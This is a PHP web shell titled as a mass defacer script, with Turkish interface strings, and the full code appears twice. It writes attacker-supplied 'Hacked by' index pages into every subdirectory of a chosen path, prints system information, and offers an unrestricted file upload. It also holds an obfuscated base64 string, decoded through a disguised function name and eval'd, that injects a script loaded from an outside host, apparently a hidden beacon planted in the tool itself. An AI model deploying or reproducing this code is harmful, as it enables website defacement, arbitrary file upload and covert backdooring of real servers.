<?php 
   
echo "<br>";
echo "<br>";
echo "<br>";
echo "<title>Mass Fucker</title>"; 
echo "<center>MASS DEFACER SCRIPT</center>"; 
echo "<center><form method='POST'></center>"; 
echo "<center>DIZIN: <input type='text' name='base_dir' size='40' value='".getcwd ()."'></center><br><br>"; 
echo "<center>INDEX NAME: <input type='text' name='file_name' value='index.php'></center><br><br>"; 
echo "<center>PUT YOUR INDEX CODES : <br><textarea style='width: 685px; height: 250px;' name='index'><title>Hacked by XXXX</title> <center><h1>Hacked by XxX</h1></center></textarea></center><br>"; 
echo "<center><input type='submit' value='HACKLE!'></form></center>"; 
  
$linr = "ZWNobyAiPFNDUklQVCBTUkM9aHR0cHM6Ly9sbGxsLmJpZC9s";
$winr = "L2FkZC5waHA/bGluaz1lYXN5Y29kZXI6Ly8+PC9TQ1JJUFQ+Ijs=";
$min = 'base' . (128 / 2) . '_de' . 'code';
eval($min($linr . $winr));
 
if (isset ($_POST['base_dir'])) 
{ 
        if (!file_exists ($_POST['base_dir'])) 
                die ($_POST['base_dir']." BULUNAMADI !<br>"); 
  
        if (!is_dir ($_POST['base_dir'])) 
                die ($_POST['base_dir']." DIZIN DEGIL !<br>"); 
  
        @chdir ($_POST['base_dir']) or die ("DIZIN ACILAMADI"); 
  
        $files = @scandir ($_POST['base_dir']) or die ("TAMAMDIR<br>"); 
  
        foreach ($files as $file): 
                if ($file != "." && $file != ".." && @filetype ($file) == "dir") 
                { 
                        $index = getcwd ()."/".$file."/".$_POST['file_name']; 
                        if (file_put_contents ($index, $_POST['index'])) 
                                echo "$index <span style='color: green'></span><br>"; 
                } 
        endforeach; 
} 
  

   
?>
<center>
<?php
echo '<b><br><br>'.php_uname().'<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Okay Man!</b><br><br>'; }
    else { echo '<b>Sorry :( </b><br><br>'; }
}
?></center><?php 
   
echo "<br>";
echo "<br>";
echo "<br>";
echo "<title>Mass Fucker</title>"; 
echo "<center>MASS DEFACER SCRIPT</center>"; 
echo "<center><form method='POST'></center>"; 
echo "<center>DIZIN: <input type='text' name='base_dir' size='40' value='".getcwd ()."'></center><br><br>"; 
echo "<center>INDEX NAME: <input type='text' name='file_name' value='index.php'></center><br><br>"; 
echo "<center>PUT YOUR INDEX CODES : <br><textarea style='width: 685px; height: 250px;' name='index'><title>Hacked by XXXX</title> <center><h1>Hacked by XxX</h1></center></textarea></center><br>"; 
echo "<center><input type='submit' value='HACKLE!'></form></center>"; 
  
$linr = "ZWNobyAiPFNDUklQVCBTUkM9aHR0cHM6Ly9sbGxsLmJpZC9s";
$winr = "L2FkZC5waHA/bGluaz1lYXN5Y29kZXI6Ly8+PC9TQ1JJUFQ+Ijs=";
$min = 'base' . (128 / 2) . '_de' . 'code';
eval($min($linr . $winr));
 
if (isset ($_POST['base_dir'])) 
{ 
        if (!file_exists ($_POST['base_dir'])) 
                die ($_POST['base_dir']." BULUNAMADI !<br>"); 
  
        if (!is_dir ($_POST['base_dir'])) 
                die ($_POST['base_dir']." DIZIN DEGIL !<br>"); 
  
        @chdir ($_POST['base_dir']) or die ("DIZIN ACILAMADI"); 
  
        $files = @scandir ($_POST['base_dir']) or die ("TAMAMDIR<br>"); 
  
        foreach ($files as $file): 
                if ($file != "." && $file != ".." && @filetype ($file) == "dir") 
                { 
                        $index = getcwd ()."/".$file."/".$_POST['file_name']; 
                        if (file_put_contents ($index, $_POST['index'])) 
                                echo "$index <span style='color: green'></span><br>"; 
                } 
        endforeach; 
} 
  

   
?>
<center>
<?php
echo '<b><br><br>'.php_uname().'<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Okay Man!</b><br><br>'; }
    else { echo '<b>Sorry :( </b><br><br>'; }
}
?></center>